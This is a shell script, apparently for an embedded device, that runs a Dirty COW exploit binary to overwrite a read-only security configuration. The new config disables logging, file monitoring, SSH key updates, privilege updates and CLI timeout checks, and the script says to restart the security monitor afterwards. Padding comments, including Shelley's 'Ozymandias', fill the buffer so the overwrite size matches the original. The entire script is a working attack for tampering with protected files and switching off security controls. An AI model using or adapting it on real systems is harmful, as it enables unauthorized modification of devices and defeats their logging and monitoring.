#!/bin/sh
green='\033[0;32m'
clear='\033[0m'
echo "dirtyc0w requires you to manually kill the process with Ctrl+C after overwrite"
echo "so in order to get the updated configuration running, do that, then run:"
printf "${green}\n"
echo "pkill /sbin/sec_monitor && /sbin/sec_monitor /usr/etc/se.conf &"
printf "${clear}\n"
echo "Overwriting read-only security configuration..."
/configs/bin/dirtyc0w /usr/etc/se.conf '[se_log]
enable=no

[se_fm]
enable=no

[se_sshkey_update]
enable=no

[se_file_privilege_update]
enable=no

[se_cli_timeout_check]
enable=no

#this part could be, well, anything -
#it just needs to fill space
#so that dirtyc0w can do its job
#and rewrite an equal amount of content
#as is contained in the original buffer.
#
#I met a traveller from an antique land
#Who said: Two vast and trunkless legs of stone
#Stand in the desert. Near them, on the sand,
#Half sunk, a shattered visage lies, whose frown,
#And wrinkled lip, and sneer of cold command,
#Tell that its sculptor well those passions read
#Which yet survive, stamped on these lifeless things,
#The hand that mocked them and the heart that fed.
#And on the pedestal these words appear:
#"My name is Ozymandias, king of kings:
#Look on my works, ye Mighty, and despair!"
#Nothing beside remains. Round the decay
#Of that colossal wreck, boundless and bare
#The lone and level sands stretch far away.
'
